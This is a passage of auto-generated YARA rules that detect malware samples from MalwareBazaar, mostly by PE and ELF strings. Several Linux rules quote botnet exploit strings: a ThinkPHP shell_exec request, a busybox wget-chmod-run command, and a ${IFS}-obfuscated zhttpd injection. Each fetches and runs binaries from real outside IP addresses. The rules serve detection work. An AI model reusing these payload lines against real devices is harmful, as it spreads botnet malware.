        filesize < 65KB and
        all of them
}

rule Windows_4fad16bbb59875a3c26bb8b202abffd86217db7462463fece59db8f7aa0f99b9
{
    meta:
        description = "Auto ML: 4fad16bbb59875a3c26bb8b202abffd86217db7462463fece59db8f7aa0f99b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.ComponentModel"
        $s7 = "System.CodeDom.Compiler"
        $s8 = "System.Diagnostics"
        $s9 = "DebuggerNonUserCodeAttribute"
        $s10 = "System"
        $s11 = "Microsoft.VisualBasic.CompilerServices"
        $s12 = "StandardModuleAttribute"
        $s13 = "HideModuleNameAttribute"
        $s14 = "GetObjectValue"
        $s15 = "GetHashCode"
        $s16 = "GetTypeFromHandle"
        $s17 = "CreateInstance"
        $s18 = "System.Runtime.InteropServices"
        $s19 = "ThreadStaticAttribute"
        $s20 = "m_ThreadStaticValue"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 160KB and
        all of them
}

rule Windows_4fe911ede9a29b44a66d87b13e1a2218bbd850a8dec352bdc92b25f8f0ba6fff
{
    meta:
        description = "Auto ML: 4fe911ede9a29b44a66d87b13e1a2218bbd850a8dec352bdc92b25f8f0ba6fff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 392KB and
        all of them
}

rule Windows_500216109d1c8e0795d241ce4c386483c504ddd19c0bff53e6c820456abb6214
{
    meta:
        description = "Auto ML: 500216109d1c8e0795d241ce4c386483c504ddd19c0bff53e6c820456abb6214"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5090KB and
        all of them
}

rule Windows_504e1940bd93e130262a7bd2b15fb622f178e2b533bfb5514ddc860ea164266d
{
    meta:
        description = "Auto ML: 504e1940bd93e130262a7bd2b15fb622f178e2b533bfb5514ddc860ea164266d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Drawing.Drawing2D"
        $s6 = "GetFEN"
        $s7 = "SetFEN"
        $s8 = "System.IO"
        $s9 = "get_PositionX"
        $s10 = "set_PositionX"
        $s11 = "get_PositionY"
        $s12 = "set_PositionY"
        $s13 = "System.Media"
        $s14 = "Thread"
        $s15 = "UserControl1_Load"
        $s16 = "Form1_Load"
        $s17 = "add_Load"
        $s18 = "UcChessBoard_Load"
        $s19 = "UcChessPiece_Load"
        $s20 = "UcChessCell_Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 541KB and
        all of them
}

rule Linux_505e855170ca3ea5c80443e29f6ebbe9b8d96126205f5f020e7537cd9422cf06
{
    meta:
        description = "Auto ML: 505e855170ca3ea5c80443e29f6ebbe9b8d96126205f5f020e7537cd9422cf06"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB and
        all of them
}

rule Windows_50933a6f60adfa71021386f9060bd9134b9023713ac2f38ec1587b6967442417
{
    meta:
        description = "Auto ML: 50933a6f60adfa71021386f9060bd9134b9023713ac2f38ec1587b6967442417"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_EmpresaID"
        $s5 = "set_EmpresaID"
        $s6 = "iKajzoMXhcsetpgE"
        $s7 = "PCFtV9T315ukcwInJ"
        $s8 = "System.IO"
        $s9 = "9ZopbMgsYNRCWKiwIna"
        $s10 = "System.Collections.Generic"
        $s11 = "Read"
        $s12 = "Load"
        $s13 = "costura.costura.pdb.compressed"
        $s14 = "costura.classlibrary1.dll.compressed"
        $s15 = "costura.costura.dll.compressed"
        $s16 = "costura.system.diagnostics.diagnosticsource.dll.compressed"
        $s17 = "costura.system.runtime.compilerservices.unsafe.dll.compressed"
        $s18 = "System.Runtime.CompilerServices.Unsafe"
        $s19 = "get_Name"
        $s20 = "GetName"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 866KB and
        all of them
}

rule Windows_50cf85d037d2fe01a82a569ab2042458f92b58fea3d4a417bfe3c59a8c42e7ba
{
    meta:
        description = "Auto ML: 50cf85d037d2fe01a82a569ab2042458f92b58fea3d4a417bfe3c59a8c42e7ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "MwinffbOVlw3KQPfxp4"
        $s13 = "System.IO"
        $s14 = "NamBGiVuSFWinlmafZ9"
        $s15 = "<Module>{22332A7A-8BCD-493E-B1D0-42C6A4C78DB6}"
        $s16 = "System.Text"
        $s17 = "get_Length"
        $s18 = "get_Chars"
        $s19 = "System.Collections.Generic"
        $s20 = "System.Linq"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2063KB and
        all of them
}

rule Linux_50d189225163e37c71a56460701bffb50255e93489bd08b32633d93dd0b59c36
{
    meta:
        description = "Auto ML: 50d189225163e37c71a56460701bffb50255e93489bd08b32633d93dd0b59c36"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/proc/%s/cmdline"
        $s7 = "/bin/systemd"
        $s8 = "/var/Challenget"
        $s9 = "[killer] Failed to create child process."
        $s10 = "deleted"
        $s11 = "payloadasdf"
        $s12 = "GET /%s HTTP/1.0"
        $s13 = "User-Agent: Update v1.0"
        $s14 = "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;"
        $s15 = "No such file or directory"
        $s16 = "No such process"
        $s17 = "Interrupted system call"
        $s18 = "Bad file descriptor"
        $s19 = "No child processes"
        $s20 = "Resource temporarily unavailable"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 147KB and
        all of them
}

rule Windows_0625a9efaf502b585558b4d5e8942ca543814e60bd53603c98a76e01a9e4f488
{
    meta:
        description = "Auto ML: 0625a9efaf502b585558b4d5e8942ca543814e60bd53603c98a76e01a9e4f488"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4589KB and
        all of them
}

rule Linux_50ec179db9a98b015b8462f1b093be2100fda3d0516b0b39e57b9ffbbf13db1d
{
    meta:
        description = "Auto ML: 50ec179db9a98b015b8462f1b093be2100fda3d0516b0b39e57b9ffbbf13db1d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 26KB and
        all of them
}

rule Windows_5114522e3999f4c6757cfe457bcc0fa1263fccf2bcbf742a1fec0f6cc81e5aa6
{
    meta:
        description = "Auto ML: 5114522e3999f4c6757cfe457bcc0fa1263fccf2bcbf742a1fec0f6cc81e5aa6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "chronological_setup_of_the_operating_software"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System"
        $s7 = "System.Diagnostics"
        $s8 = "System.Reflection"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "System.Core"
        $s14 = "System.Security"
        $s15 = "SecurityRuleSet"
        $s16 = "System.Windows.Markup"
        $s17 = "System.Xaml"
        $s18 = "System.Diagnostics.CodeAnalysis"
        $s19 = "chronological_setup_of_the_operating_software.exe"
        $s20 = "<Module>"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6461KB and
        all of them
}

rule Windows_5134138e30037482cf3fee2a5c98ffb05cb45acf6e6012757f18a2f1c92a6a03
{
    meta:
        description = "Auto ML: 5134138e30037482cf3fee2a5c98ffb05cb45acf6e6012757f18a2f1c92a6a03"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<ResetNetStatus>b__60_0"
        $s5 = "UserControl1"
        $s6 = "WindowsFormsControlLibrary1"
        $s7 = "<Module>"
        $s8 = "get_ASCII"
        $s9 = "System.IO"
        $s10 = "System.Data"
        $s11 = "get_GetData"
        $s12 = "set_GetData"
        $s13 = "get_RawData"
        $s14 = "set_RawData"
        $s15 = "System.Collections.Generic"
        $s16 = "buttonLoadPtc"
        $s17 = "get_CanRead"
        $s18 = "get_BytesToRead"
        $s19 = "Thread"
        $s20 = "add_Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 719KB and
        all of them
}

rule Windows_516e1b54eb023601fd25f0c943fccb91dee0335c714515e2e263eb927642ebbe
{
    meta:
        description = "Auto ML: 516e1b54eb023601fd25f0c943fccb91dee0335c714515e2e263eb927642ebbe"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetNextPlayerCards>b__3_0"
        $s5 = "<GetCardNum>b__7_0"
        $s6 = "<LoadTemplate>b__8_0"
        $s7 = "<RemoveOffsetBlobs>b__0"
        $s8 = "<GetBestResult>b__0"
        $s9 = "get_Scan0"
        $s10 = "<GetNextPlayerCards>b__3_1"
        $s11 = "<GetCardNum>b__7_1"
        $s12 = "<LoadTemplate>b__8_1"
        $s13 = "<RemoveOffsetBlobs>b__1"
        $s14 = "WindowsFormsApplication1"
        $s15 = "<LoadTemplate>b__2"
        $s16 = "<RemoveOffsetBlobs>b__2"
        $s17 = "<LoadTemplate>b__3"
        $s18 = "<Module>"
        $s19 = "System.IO"
        $s20 = "get_pNGP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 931KB and
        all of them
}

rule Windows_51745628d4c34c4b7fc4da7451ef6ca27fdeb2183423be4cc44dc67400184196
{
    meta:
        description = "Auto ML: 51745628d4c34c4b7fc4da7451ef6ca27fdeb2183423be4cc44dc67400184196"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "`.reloc"
        $s3 = "cmdi"
        $s4 = "WINp"
        $s5 = "kernel32.dll"
        $s6 = "GetModuleHandleA"
        $s7 = "USER32.dll"
        $s8 = "ADVAPI32.dll"
        $s9 = "OpenProcessToken"
        $s10 = "OLEAUT32.dll"
        $s11 = "MSVCP140.dll"
        $s12 = "D3DX11CreateShaderResourceViewFromMemory"
        $s13 = "ntdll.dll"
        $s14 = "D3D11CreateDeviceAndSwapChain"
        $s15 = "ImmSetCandidateWindow"
        $s16 = "D3DCOMPILER_43.dll"
        $s17 = "dwmapi.dll"
        $s18 = "VCRUNTIME140_1.dll"
        $s19 = "VCRUNTIME140.dll"
        $s20 = "api-ms-win-crt-stdio-l1-1-0.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19837KB and
        all of them
}

rule Windows_51975425e3be5bbe808e1dbe7b191382f4f1597a025f622f0462da72b31d5e38
{
    meta:
        description = "Auto ML: 51975425e3be5bbe808e1dbe7b191382f4f1597a025f622f0462da72b31d5e38"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s8 = "DeleteFileA"
        $s9 = "FindFirstFileA"
        $s10 = "FindNextFileA"
        $s11 = "FindClose"
        $s12 = "SetFilePointer"
        $s13 = "ReadFile"
        $s14 = "WriteFile"
        $s15 = "GetPrivateProfileStringA"
        $s16 = "WritePrivateProfileStringA"
        $s17 = "GetProcAddress"
        $s18 = "LoadLibraryExA"
        $s19 = "GetModuleHandleA"
        $s20 = "GetExitCodeProcess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 412KB and
        all of them
}

rule Windows_5197d164e1d16e3fe5c6dcb412a37dca383710da9ed4ee3a8396a4a70c77e456
{
    meta:
        description = "Auto ML: 5197d164e1d16e3fe5c6dcb412a37dca383710da9ed4ee3a8396a4a70c77e456"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "CbSDa[*GeTihc"
        $s5 = "vPqwiNp<L}?"
        $s6 = "GeTjwbL@w"
        $s7 = "vLtGeTi<kOQqvk5I"
        $s8 = "HgLsGeTioe"
        $s9 = "sRqwiNw>L}J%"
        $s10 = "sRqwiNw>L}"
        $s11 = "YUqwiNQ9L}?!aR>@Fz)"
        $s12 = "nLxGeTijc^T`{"
        $s13 = "-7l!9YgET"
        $s14 = "O=q0kwInLRP"
        $s15 = "Ozq)kwINLAP4i"
        $s16 = "WInY`"
        $s17 = "<Module>"
        $s18 = "get_OpenPDF"
        $s19 = "get_ImageURL"
        $s20 = "set_ImageURL"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1848KB and
        all of them
}

rule Windows_51f24503d32c9e10a2e7afe027d438380d007cd1566e5399cc52b039cacdb2ea
{
    meta:
        description = "Auto ML: 51f24503d32c9e10a2e7afe027d438380d007cd1566e5399cc52b039cacdb2ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1285KB and
        all of them
}

rule Windows_521f14c5c2d45f03ca468a5ea3cb1532c0b25ecaa6a8561a8100bdd99f64f9be
{
    meta:
        description = "Auto ML: 521f14c5c2d45f03ca468a5ea3cb1532c0b25ecaa6a8561a8100bdd99f64f9be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 252KB and
        all of them
}

rule Linux_52371fcb121f380c601d660c7a3baacfcd0d20cdb6f28ce884c66d7c43010dd8
{
    meta:
        description = "Auto ML: 52371fcb121f380c601d660c7a3baacfcd0d20cdb6f28ce884c66d7c43010dd8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
        $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
        $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
        $s6 = "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s7 = "dayzddos.co runs you if you read this lol then you tcp dumped it because it hit you and you need to patch it lololololol"
        $s8 = "%s %s HTTP/1.1"
        $s9 = "User-Agent: %s"
        $s10 = "Connection: close"
        $s11 = "%s /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s12 = "HTTPSTOPM"
        $s13 = "HTTP"
        $s14 = "No such file or directory"
        $s15 = "No such process"
        $s16 = "Interrupted system call"
        $s17 = "Bad file descriptor"
        $s18 = "No child processes"
        $s19 = "Resource temporarily unavailable"
        $s20 = "File exists"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 115KB and
        all of them
}

rule Linux_0694efe67f4e22a5989a53f5279a760870b75688c7cc590ed3eb629e9f25401f
{
    meta:
        description = "Auto ML: 0694efe67f4e22a5989a53f5279a760870b75688c7cc590ed3eb629e9f25401f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 21KB and
        all of them
}

rule Windows_525d9778857fedb37303bdcb4b6f8fa57c1bf8c1a62ca25365277d4efb3265e8
{
    meta:
        description = "Auto ML: 525d9778857fedb37303bdcb4b6f8fa57c1bf8c1a62ca25365277d4efb3265e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1243KB and
        all of them
}

rule Windows_526539d41092e31a6eb4097cc93b55285d758b41e992d11c1819767306f08f30
{
    meta:
        description = "Auto ML: 526539d41092e31a6eb4097cc93b55285d758b41e992d11c1819767306f08f30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1034KB and
        all of them
}

rule Windows_527b2b31bcee94426ba4d03e16a941e21c739da69e9a40f023631fdbfc29fae5
{
    meta:
        description = "Auto ML: 527b2b31bcee94426ba4d03e16a941e21c739da69e9a40f023631fdbfc29fae5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_PaBC"
        $s6 = "System.Data"
        $s7 = "get_Magenta"
        $s8 = "Form1_Load"
        $s9 = "add_Load"
        $s10 = "Login_Load"
        $s11 = "txtUser_TextChanged"
        $s12 = "get_Checked"
        $s13 = "set_Checked"
        $s14 = "set_DataSource"
        $s15 = "set_AutoScaleMode"
        $s16 = "set_AutoSizeMode"
        $s17 = "set_ColumnHeadersHeightSizeMode"
        $s18 = "set_Image"
        $s19 = "set_Visible"
        $s20 = "GetTypeFromHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 40960KB and
        all of them
}

rule Windows_52bed4d9c0fdb81bdc4abfd46b47b8f8fa2dcdd570fcdc94f300f087c8b3aa65
{
    meta:
        description = "Auto ML: 52bed4d9c0fdb81bdc4abfd46b47b8f8fa2dcdd570fcdc94f300f087c8b3aa65"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.reloc"
        $s3 = "B.rsrc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "NanoCore Client.exe"
        $s6 = "System.Windows.Forms"
        $s7 = "System"
        $s8 = "System.Drawing"
        $s9 = "kernel32.dll"
        $s10 = "psapi.dll"
        $s11 = "advapi32.dll"
        $s12 = "ntdll.dll"
        $s13 = "dnsapi.dll"
        $s14 = "ClientLoaderForm.resources"
        $s15 = "User"
        $s16 = "Microsoft.VisualBasic.CompilerServices"
        $s17 = "StandardModuleAttribute"
        $s18 = "HideModuleNameAttribute"
        $s19 = "Registry"
        $s20 = "Microsoft.Win32"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 204KB and
        all of them
}

rule Windows_52dd30e29abf61d4e6ea0ca34e23649fe98c73d6529c5b5253825660f0d0f919
{
    meta:
        description = "Auto ML: 52dd30e29abf61d4e6ea0ca34e23649fe98c73d6529c5b5253825660f0d0f919"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5081KB and
        all of them
}

rule Windows_52ec0772eb7a1e76c0f99e8dcc8b377a9de782fb744d5be7386ce8c765162409
{
    meta:
        description = "Auto ML: 52ec0772eb7a1e76c0f99e8dcc8b377a9de782fb744d5be7386ce8c765162409"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s8 = "RegSetValueExA"
        $s9 = "RegCloseKey"
        $s10 = "RegDeleteValueA"
        $s11 = "RegDeleteKeyA"
        $s12 = "OpenProcessToken"
        $s13 = "RegOpenKeyExA"
        $s14 = "RegCreateKeyExA"
        $s15 = "ADVAPI32.dll"
        $s16 = "SHFileOperationA"
        $s17 = "SHGetFileInfoA"
        $s18 = "SHGetPathFromIDListA"
        $s19 = "ShellExecuteExA"
        $s20 = "SHELL32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4438KB and
        all of them
}

rule Windows_52ecf2eaeed9b8deafb3a699cb573d5f1c90872290c3cfdd0355ca241b9f6f5b
{
    meta:
